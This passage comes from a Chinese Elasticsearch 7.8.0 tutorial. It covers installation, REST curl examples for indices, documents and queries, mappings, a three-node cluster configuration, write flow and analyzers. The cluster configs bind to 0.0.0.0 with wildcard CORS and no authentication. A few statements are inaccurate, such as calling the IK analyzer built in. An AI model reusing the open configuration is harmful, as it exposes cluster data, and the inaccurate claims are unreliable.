配置相同，它就会自动发现集群并加入到其中。当若在不同服务器启动两个节点，如果要加到同一个集群中，你需要配置一个单播主机列表，之所以配置为使用单播，以防止节点无意加入到某个集群。只有在同一台服务器上运行的节点才会自动组成集群。\n\n如果出现未被分出的副本，则集群状态会是（yellow），并不代表不健康，只是这些副本没有被有效的分配和使用，我们可以根据我们的副本数量来扩展服务器，新启动的节点会立马被安排均匀享有分片和副本数据，已达到每个分片和副本在不同的节点。\n\n当集群中过的主节点故障，会从集群中选取一个节点为主节点，并且分片也为主分片，所有的写操作也都会进入到这个节点。',normalizedContent:'# 基础概念\n\n * 索引（index）\n   es 的索引类似于 mysql 的库\n * 类型（type）\n   在一个索引中可以有一个或多个类型，通常会为相同文档格式的归为一个类型，但在 es7.x 默认不在支持索引类型的操作，文档和索引直接产生关系。\n * 文档（doc）\n   文档就是我们的 json 数据，一个索引有多个文档\n * 字段（field）\n   就是文档 json 中的属性\n * 映射（mapping）\n   mysql 表中会有相关的字段类型，是否为空，长度多少，是否索引，这些和 es 中的 mapping 相似，可以定义一个属性，以及他的类型，是否可以被索引等。\n * 分片（shards）\n   es 的分片相当于 mysql 的水平分表，比如 id % 5，不同结果落到各个被定义好的表中，可以扩展我们的存储容量，有效提高查询性能\n * 副本（replicas）\n   分片可以把数据分布到各个节点上，统一提高服务，可某个节点崩溃就会导致数据的丢失，副本就是保证分片的数据高可用的一种方案，把数据在另一台服务器复制一份。副本也可以提升一定的性能，因为搜索可以在所有的副本上并运行。\n * 分配（allocation）\n\n\n# 单机安装\n\n官网地址：https://www.elastic.co/cn/downloads/past-releases#elasticsearch，需要用一些科学手段，否则内容加载不全，不好找到我么你需要的版。\n\n# 下载\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-linux-x86_64.tar.gz\n# 解压\ntar -xvf elasticsearch-7.8.0-linux-x86_64.tar.gz\n# 启动\ncd elasticsearch-7.8.0/bin\n./elasticsearch\n# 报错，我得是jdk8，他需要jdk11\nfuture versions of elasticsearch will require java 11; your java version from [/opt/software/jdk/jre] does not meet this requirement\n\n# 修改es配置文件\ncd elasticsearch-7.8.0/bin\nvim elasticsearch-env\n# 找到有java_home的判断，设置成 es 自带的jdk，如下是我的\nif [ ! -z "$java_home" ]; then\n  java="/opt/software/elasticsearch-7.8.0/jdk/bin/java"\n  java_type="java_home"\nelse\n# 重新启动，然后又报错，意思是不能用root运行\norg.elasticsearch.bootstrap.startupexception: java.lang.runtimeexception: can not run elasticsearch as root\n\n# 创建用户，并赋予权限\nadduser es\n# 修改es用户的密码\npasswd es\n# 修改\nchown -r es:es elasticsearch-7.8.0/ \n# 切换用户登录，启动程序\nsu es\n\n# 如果遇到该类报错\nerror: [3] bootstrap checks failed\n[1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535]\n[2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]\n[3]: the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured\n\n# 需要修改一下参数，进入 vim /etc/security/limits.conf\n# sandwich表示运行elasticsearch的用户，hard与soft表示限制的类型，nofile表示max number of open file descriptors，65536表示设置的大小。\n# 这个值最终影响的是 ulimit 的open files的最大值\n* hard nofile 65536\n* soft nofile 65536\n# 修改另一个文件， vim /etc/sysctl.conf，添加如下，后执行 sysctl -p\nvm.max_map_count=655360\n# 修改 vim elasticsearch.yml，配置远程访问，及修改以上问题\nnetwork.host: 0.0.0.0\ndiscovery.seed_hosts: ["10.240.30.93"]\ncluster.initial_master_nodes: ["master"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n> 端 9300 端口为 es 集群间组件的通信口，9200 端口为浏览器访问的 http 协议 restful 端口。当 es 启动成功后我们可以通过访问 http://localhost:9200 测试结果\n\n\n# 数据格式简介\n\nelasticsearch 是面向文档型数据库，一条数据在这里就是一个文档。为了方便大家理解，我们 elasticsearch 里存储文档数据和关系型数据库 mysql 存储数据的概念进行一个类比\n\n\n\nes 里的 index 可以看做一个库，而 types 相当于表，document 则相当于表的行。这里 types 的概念已经被主键弱化，es6.x 中，一个 index 下已经只能包含一个 type，es7.x 中，type 的概念已经被删除了。\n\n在 mysql 中索引是帮助查询进行快速检索，但在 es 中为了能够坐高快速准确的查询，他使用了 倒排索引 ，有倒排索引则对应有 正排索引\n\n * 正排（正向）索引 -> 在 mysql 中，如 id，content 两个字段，通过 id 并赋予一定的索引，可以快速检索到该列满足条件的数据，但如果通过内容查询则比较麻烦，需要做模糊查询，每条数据都需要遍历，效率低下，而且还要区分内容的大小写等。\n\n      id                   content\n-------------------------------------------\n   1001                my name is zs\n   1002                my name is ls\n\n\n1\n2\n3\n4\n\n * 倒排索引 -> 倒排索引是实现 “单词 - 文档矩阵” 的一种具体存储形式，通过倒排索引，可以根据单词快速获取包含这个单词的文档列表。\n\n      keyword               id\n-------------------------------------------\n        my              1001,1002\n        ls              1002\n        zs              1001\n\n\n1\n2\n3\n4\n5\n\n\n\n# 基本操作\n\n\n# 索引\n\n# 创建索引\n\ncurl --location --request put \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n# 查看索引\n\n查询某个索引的信息\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n查看所有索引有哪些\n\ncurl --location --request get \'http://10.240.30.93:9200/_cat/indices?v\'\n\n\n1\n\n\n# 删除索引\n\ncurl --location --request delete \'http://10.240.30.93:9200/test_index\'\n\n\n1\n\n\n\n# 文档操作\n\n# 创建文档\n\n创建一个随机生成 id 的文档，索引是 test_index\n\ncurl --location --request post \'http://10.240.30.93:9200/test_index/_doc\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n   "min_position": 7,\n   "has_more_items": false,\n   "items_html": "bike",\n   "new_latent_count": 5,\n   "data": {\n      "length": 21,\n      "text": "duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."\n   },\n   "objarray": [\n      {\n         "class": "lower",\n         "age": 2\n      },\n      {\n         "class": "lower",\n         "age": 1\n      }\n   ]\n}‘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n创建一个自定义 id 位 1003 的文档，\n\ncurl --location --request post \'http://10.240.30.93:9200/test_index/_doc/1003\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "min_position": 7,\n    "has_more_items": false,\n    "items_html": "bike",\n    "new_latent_count": 5,\n    "data": {\n        "length": 21,\n        "text": "duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur."\n    },\n    "objarray": [\n        {\n            "class": "lower",\n            "age": 2\n        },\n        {\n            "class": "lower",\n            "age": 1\n        }\n    ]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 查询文档\n\n通过 id 查询文档\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/1003\'\n\n\n1\n\n\n查看 test_index 下的所有文档\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\'\n\n\n1\n\n\n# 修改文档\n\n完全覆盖以前文档的内容\n\n curl --location --request put \'http://10.240.30.93:9200/test_index/_doc/1003\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n   "data": {\n      "length": 26,\n      "text": "excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."\n   },\n   "numericalarray": [\n      30,\n      33,\n      31,\n      20,\n      30\n   ],\n   "stringarray": [\n      "carbon",\n      "oxygen",\n      "carbon",\n      "oxygen"\n   ]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n只修改文档中某些属性的值\n\ncurl --location --request post \'http://10.240.30.93:9200/test_index/_update/1003\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "data":{\n            "text": "1111111111"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n通过 id 删除某个文档\n\ncurl --location --request delete \'http://10.240.30.93:9200/test_index/_doc/1003\' \n\n\n1\n\n\n\n# 条件查询\n\n通过请求路径添加参数，注意附加 q（query） 条件的意思\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search?q=items_html:bike\'\n\n\n1\n\n\n通过 body 体附加条件进行查询\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "items_html":"bike"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n通过 body 体加条件查询索引下全部文档\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n分页查询，from 为起始位置，size 为每页大小，分页 =（from-1）*size；_source 可以指定我们需要查询的具体属性值，类似于 mysql 我们只想看哪些列的数据。\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    },\n    "from": 0,\n    "size": 2,\n    "_source": ["min_position"]\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n对数据进行排序\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match_all":{\n            \n        }\n    },\n    "sort":{\n        "new_latent_count": {\n            "order": "desc"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n多条件查询，如下类似于 mysql and 条件\n\n * must，是 and\n * should，是 or\n * fileter，是范围查询 <<=> >=\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "bool":{\n            "must":[\n                {\n                    "match":{\n                        "items_html": "bike"\n                    }\n                },\n                {\n                    "match":{\n                        "has_more_items": false\n                    }\n                }\n\n            ]\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "bool":{\n            "filter":{\n                "range":{\n                    "data.length": {\n                        "gt": 19\n                    }\n                }\n            }\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 全文检索 & 完全匹配 & 高亮查询 & 聚合查询\n\n按照单词查询，只要包含这个单词全部查询出来，如果是汉子的话会把每个汉子放进倒排索引中，该方式称为全文检索。match 是全文匹配，更换为 match_phrase 则是完全匹配。\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "data.text":"duis"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n高亮查询，我们可以设置高亮来让匹配的内容进行明显的显示\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "data.text":"duis"\n        }\n    },\n    "highlight":{\n        "fields":{\n            "data.text": {}\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n聚合查询，对相同内容进行次数统计\n\ncurl --location --request get \'http://10.240.30.93:9200/test_index/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "aggs":{ // 聚合操作\n        "min_position_count":{ // 聚合后的名称，可以随意起名\n            "terms": { // 分组操作\n                "field": "min_position" // 分组字段\n            }\n        }\n    },\n    "size": 0 // 表示不显示原始数据\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 映射关系\n\n有的属性可以分词查询，有的属性不能分词查询，这个分还是不分，我们是可以设置的。在 mysql 中表的一个字段的类型、长度这些信息都属于表的结构信息，在 es 中也有类似的概念，我们称之为映射。\n\n# 创建一个 user 索引\ncurl --location --request put \'http://10.240.30.93:9200/user\'\n\n# 创建结构信息\ncurl --location --request put \'http://10.240.30.93:9200/user/_mapping\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "properties": { // 定义结构化信息\n        // 定义一个name 属性\n        "name": {\n            "type": "text", // name类型为 text文本(可以被分词)\n            "index": true // 表示该字段可以被索引查询\n        },\n        "sex": {\n            "type": "keyword", // 表示不能被分词，需要完整匹配\n            "index": true // 表示该字段使用索引\n        },\n        "tel": {\n            "type": "keyword", // 表示不能被分词，需要完整匹配\n            "index": false // 表示不能被索引\n        }\n    }\n}\'\n\n# 查看结构化信息\ncurl --location --request get \'http://10.240.30.93:9200/user/_mapping\' \\\n--data-raw \'\'\n\n# 增加数据\ncurl --location --request post \'http://10.240.30.93:9200/user/_doc/1003\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "name": "张三",\n    "sex": "男",\n    "tel": "135xxxxxx05"\n}\'\n\n# 有分词效果的查询\ncurl --location --request get \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "name":"张"\n        }\n    }\n}\'\n\n# 全部匹配，sex只对应以上值能是 男，如果值是 男的，那么键入 男 也是查不到的，必须是男的\ncurl --location --request get \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "sex":"男的"\n        }\n    }\n}\'\n\n# 不能被索引（index: false），索引该属性则会报错，因为不能被索引（查询）\ncurl --location --request get \'http://10.240.30.93:9200/user/_doc/_search\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "query":{\n        "match":{\n            "tel":"135xxxxxx05"\n        }\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n\n# 分片及副本\n\n创建 user 索引，并为其创建 3 个分片，以及各主分片都有 1 个副本\n\ncurl --location --request put \'http://10.240.30.93:9200/user\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "settings":{\n        "number_of_shards": 3, // 对索引下的文档创建3个分片\n        "number_of_replicas": 1 // 每个主分片都有1个副本\n    }\n}\'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n查询所创建的索引\n\ncurl --location --request get \'http://10.240.30.93:9200/user\' \n\n{\n    "user": {\n        "aliases": {},\n        "mappings": {},\n        "settings": {\n            "index": {\n                "creation_date": "1653730124456",\n                "number_of_shards": "3", // 分片\n                "number_of_replicas": "1", // 副本\n                "uuid": "e7li_zhorhwfsnkgocy3tg",\n                "version": {\n                    "created": "7080099"\n                },\n                "provided_name": "user"\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n修改副本的数量\n\ncurl --location --request put \'http://10.240.30.93:9200/user/_settings\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "number_of_replicas": 2\n}\'\n\n\n1\n2\n3\n4\n5\n\n\n\n# 集群搭建\n\n一个集群是由多个服务器节点组织在一起，共同持有整个的数据，并一起提供索引和搜索功能。一个 es 集群有一个唯一的名字，整个名字默认就是 "elasticsearch"。这个名字是重要的。因为一个节点只能通过指定某个集群的名字，来加入这个集群。\n\n集群中包含很多的服务器，一个节点就是其中一个服务器。作为集群的一部分，它存储数据，参与集群的索引和搜索功能。\n\n一个节点也是由名字来标识的，默认情况下，这个名字是一个随机漫威漫画角色的名字，这个名字会在启动的时候赋予节点。这个名字对于管理工作来说很重要，因为在这个管理过程中，你回去确定网络中的哪些服务器对应于 elasticsearch 集群中的哪些节点。\n\n一个节点可以通过配置集群名称的方式来加入一个指定的集群。默认情况下，每个节点都会被安排加入到一个叫做 "elasticsearch" 的集群中，这意味着，如果你在你的网络中启动了若干个节点，并假定他们能够相互发现彼此，他们将会自动形成并加入到一个叫做 "elasticsearch" 的集群中。\n\n# node1 修改 elasticsearch.yml\ncluster.name: elasticsearch-1 # 指定集群的名称\nnode.name: node1 # 指定节点的名称\nnode.master: true # 让该节点作为主节点\nnode.data: true # 让该节点作为数据节点\nnetwork.host: node1 # 指定本机的ip，我的在 host中做个映射\nhttp.port: 9200 # http 请求地址\ntransport.tcp.port: 9300 # 集群通信端口\nhttp.cors.enabled: true # 跨域配置\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # 单条数据最大内容为200mb的数据\n\ncluster.initial_master_nodes: ["node1"] # es7.x之后新增的配置，初始化个新的集群时需要此配置来选举master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # 节点发现\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # 集群内同时启动的数据任务个数，默认是2个\ncluster.routing.allocation.node_concurrent_recoveries: 16 # 添加或删除节点及负载均衡时并发恢复的线程个数，默认4个\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # 初始化数据恢复时，并发恢复线程的个数，默认4个\n\n# node2 修改 elasticsearch.yml\ncluster.name: elasticsearch-1 # 指定集群的名称\nnode.name: node2 # 指定节点的名称\nnode.master: true # 让该节点作为主节点\nnode.data: true # 让该节点作为数据节点\nnetwork.host: node2 # 指定本机的ip，我的在 host中做个映射\nhttp.port: 9200 # http 请求地址\ntransport.tcp.port: 9300 # 集群通信端口\nhttp.cors.enabled: true # 跨域配置\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # 单条数据最大内容为200mb的数据\n\ncluster.initial_master_nodes: ["node1"] # es7.x之后新增的配置，初始化个新的集群时需要此配置来选举master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # 节点发现\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # 集群内同时启动的数据任务个数，默认是2个\ncluster.routing.allocation.node_concurrent_recoveries: 16 # 添加或删除节点及负载均衡时并发恢复的线程个数，默认4个\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # 初始化数据恢复时，并发恢复线程的个数，默认4个\n\n\n# node3 修改 elasticsearch.yml\ncluster.name: elasticsearch-1 # 指定集群的名称\nnode.name: node3 # 指定节点的名称\nnode.master: true # 让该节点作为主节点\nnode.data: true # 让该节点作为数据节点\nnetwork.host: node3 # 指定本机的ip，我的在 host中做个映射\nhttp.port: 9200 # http 请求地址\ntransport.tcp.port: 9300 # 集群通信端口\nhttp.cors.enabled: true # 跨域配置\nhttp.cors.allow-origin: "*"\nhttp.max_content_length: 200mb # 单条数据最大内容为200mb的数据\n\ncluster.initial_master_nodes: ["node1"] # es7.x之后新增的配置，初始化个新的集群时需要此配置来选举master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # 节点发现\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # 集群内同时启动的数据任务个数，默认是2个\ncluster.routing.allocation.node_concurrent_recoveries: 16 # 添加或删除节点及负载均衡时并发恢复的线程个数，默认4个\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # 初始化数据恢复时，并发恢复线程的个数，默认4个\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n我们可以通过 es 提供的接口 api 来查看集群的状态\n\n# 查看节点\ncurl --location --request get \'http://10.240.30.93:9200/_cat/nodes\'\n\n# 查看集群状态\ncurl --location --request get \'http://10.240.30.93:9200/_cluster/health\'\n\n# 返回信息\n{\n    "cluster_name": "elasticsearch-1", // 集群名称\n    "status": "yellow",\n    "timed_out": false,\n    "number_of_nodes": 1, // 有多少个节点\n    "number_of_data_nodes": 1, // 有多少个数据节点\n    "active_primary_shards": 2, // 分片\n    "active_shards": 2,\n    "relocating_shards": 0,\n    "initializing_shards": 0,\n    "unassigned_shards": 2,\n    "delayed_unassigned_shards": 0,\n    "number_of_pending_tasks": 0,\n    "number_of_in_flight_fetch": 0,\n    "task_max_waiting_in_queue_millis": 0,\n    "active_shards_percent_as_number": 50.0\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n当你在同一台服务器上启动两个节点时，只要他和第一个节点的 cluster.name 配置相同，它就会自动发现集群并加入到其中。当若在不同服务器启动两个节点，如果要加到同一个集群中，你需要配置一个单播主机列表，之所以配置为使用单播，以防止节点无意加入到某个集群。只有在同一台服务器上运行的节点才会自动组成集群。\n\n如果出现未被分出的副本，则集群状态会是（yellow），并不代表不健康，只是这些副本没有被有效的分配和使用，我们可以根据我们的副本数量来扩展服务器，新启动的节点会立马被安排均匀享有分片和副本数据，已达到每个分片和副本在不同的节点。\n\n当集群中过的主节点故障，会从集群中选取一个节点为主节点，并且分片也为主分片，所有的写操作也都会进入到这个节点。',charsets:{cjk:!0}},{title:"ES 7.8.0（二） 读、写和写索引流程以及文档分析过程",frontmatter:{title:"ES 7.8.0（二） 读、写和写索引流程以及文档分析过程",date:"2023-06-25T09:22:36.000Z",permalink:"/es/1801",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/05.Elasticsearch/1801.ES%207.8.0%EF%BC%88%E4%BA%8C%EF%BC%89%20%E8%AF%BB%E3%80%81%E5%86%99%E5%92%8C%E5%86%99%E7%B4%A2%E5%BC%95%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8A%E6%96%87%E6%A1%A3%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B.html",relativePath:"02.中间件/05.Elasticsearch/1801.ES 7.8.0（二） 读、写和写索引流程以及文档分析过程.md",key:"v-e5da1462",path:"/es/1801/",headers:[{level:2,title:"读写及更新流程",slug:"读写及更新流程",normalizedTitle:"读写及更新流程",charIndex:2},{level:2,title:"ES写索引流程",slug:"es写索引流程",normalizedTitle:"es 写索引流程",charIndex:752},{level:2,title:"文档分析",slug:"文档分析",normalizedTitle:"文档分析",charIndex:1496},{level:3,title:"内置分析器",slug:"内置分析器",normalizedTitle:"内置分析器",charIndex:1862},{level:3,title:"测试分析器",slug:"测试分析器",normalizedTitle:"测试分析器",charIndex:2224}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"读写及更新流程 ES写索引流程 文档分析 内置分析器 测试分析器",content:'# 读写及更新流程\n\n\n\nP 代表着分片，R 代表着副本，从图中可以看出有 2 个分片，每个分片在不同的节点上，而一个节点上有其他分片的副本，ES 为内部会把分片和副本均匀的散在节点上。具体写流程如下：\n\n 1. 客户端请求集群（任意）节点，找到的节点会被称为协调节点，图中为指定 node2 为协调节点\n 2. 协调节点将请求经过对数据 hash (id) % 分片数量 得到结果后请求到另个节点或自己，图中为 P0\n 3. 主分片会将请求的数据进行保存\n 4. 主分片会将数据发送给拥有该分片副本的节点，进行数据同步\n 5. 副本保存完后进行成功反馈\n 6. 主分片得到反馈后，把自己的结果一并反馈给客户端\n\n参数            描述\nconsistency   默认值：quorum，即大多数的分片副本状态没问题就允许执行写操作；one，只要主分片状态 ok\n              就允许执行写操作；all，必须所有主分片和所有副本的状态没问题才允许执行写操作\ntimeout       如果没有足够的副本，ES 会等待，希望更多的副本出现，默认情况下是 1 分钟，你可以任意更改如 30s\n\n\n\n 1. 客户端发送请求到协调节点\n 2. 协调节点计算得到数据所在的分片位置以及全部的副本位置\n 3. 得到分片位置和副本所有的位置，为达到负载均衡，进行轮训，找到一个不是很忙的节点。\n 4. 把请求转发给节点，节点得到数据并返回给客户端。\n\n\n\n 1. 客户端发送请求到协调节点\n 2. 协调节点计算得到数据所在的分片位置以及全部的副本位置\n 3. 修改，为防止多个线程修改，他会不停的尝试修改\n 4. 修改成功后修改副本，副本修改成功后会通知主分片，主分片在反馈给客户端\n\n\n# ES 写索引流程\n\n\n\n 1. 用户创建了一个新文档，新文档被写入内存中；\n 2. refresh 操作提交缓存，这时缓存中数据会以 segment 的形式被先写入到文件缓存系统。这是因为，提交一个新的 segment 到磁盘需要一个 fsync 来确保 segment 被物理性地写入磁盘，这样在断电的时候就不会丢失数据。 但是 fsync 操作代价很大，如果每次索引一个文档都去执行一次的话会造成很大的性能问题，但是这里新 segment 会被先写入到文件系统缓存，这一步代价会比较低；\n 3. 新的 segment 被写入到文件缓存系统，这时内存缓存被清空。在文件缓存系统会存在一个未提交的 segment。虽然新 segment 未被 commit（刷到磁盘），但是文件已经在缓存中了，此时就可以像其它文件一样被打开和读取了；\n 4. 到目前为止索引的 segment 还未被刷新到磁盘，如果没有用 fsync 把数据从文件系统缓存刷（flush）到硬盘，我们不能保证数据在断电甚至是程序正常退出之后依然存在。Elasticsearch 增加了一个 translog ，或者叫事务日志，在每一次对 Elasticsearch 进行操作时均进行了日志记录。如上图所示，一个文档被索引之后，就会被添加到内存缓冲区，并且同时追加到了 translog；\n 5. 每隔一段时间，更多的文档被添加到内存缓冲区和追加到事务日志（translog），之后新 segment 被不断从内存缓存区被写入到文件缓存系统，这时内存缓存被清空，但是事务日志不会。随着 translog 变得越来越大，达到一定程度后索引被刷新，在刷新（flush）之后，segment 被全量提交（被写入硬盘）。\n\n\n# 文档分析\n\n分析器包含 将一块文本分成合适于倒排索引的独立的词条，将这些词条统一化为标准格式以提高它们的"可搜索"性，或者recall。 分析器做着如上的工作，但分析器只包含了三个主要的功能：\n\n * 字符过滤器\n   首先，字符串按顺序通过每个字符过滤器，它们的任务是在分词前整理字符串。一个字符串过滤器可以用来去掉 HTML，或者将 & 转化为 and。\n * 分词器\n   其次，字符串被分词器分为单个的词条。一个简单的分词器遇到空格和标点的时候，可能会将文本拆分成词条。\n * Token 过滤器\n   最后，词条按顺序通过每个 Token 过滤器。这个过程可能会改变词条（例如，小写化 Quick），删除词条（例如，像 a，and，the 等无用词），或者增加词条（例如，像 jump 和 leap 这种同义词）\n\n\n# 内置分析器\n\nElasticsearch 还附带了可以直接使用的预包装的分析器。接下来我们会列出最重要的分析器：\n\n * 标准分析器\n   标准分析器是 Elasticsearch 默认使用的分析器。它是分析各种语言文本最常用的选择。他根据 Unicode 联盟定义的单词边界划分文本。删除绝大部分标点。最后，将细条小写。\n * 简单分析器\n   简单分析器在任何不是字母的地方分割文本，将词条小写。\n * 空格分析器\n   空格分析器在空格的地方划文本。\n * 语言分析器\n   特定语言分析器可用于很多语。他们可以考虑指定语言的特点。例如，英语分析器附带了一组英语无用词（常用单词，例如 and 或者 the，他们对相关性没有多少影响），他们会被删除。由于理解英语语法的规则，这个分词器可以提取英语单词的词干。\n\n\n# 测试分析器\n\n标准分析器\n\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "analyzer":"standard",\n    "text": "Text to analyzer"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "text", // token 分解后的词条\n            "start_offset": 0, // 偏移量\n            "end_offset": 4,\n            "type": "<ALPHANUM>",\n            "position": 0 // 位置\n        },\n        {\n            "token": "to",\n            "start_offset": 5,\n            "end_offset": 7,\n            "type": "<ALPHANUM>",\n            "position": 1\n        },\n        {\n            "token": "analyzer",\n            "start_offset": 8,\n            "end_offset": 16,\n            "type": "<ALPHANUM>",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nIK 分词器，这款分词器是 ES 自带，并不是理想的那么好\n\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "text": "测试用例"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": 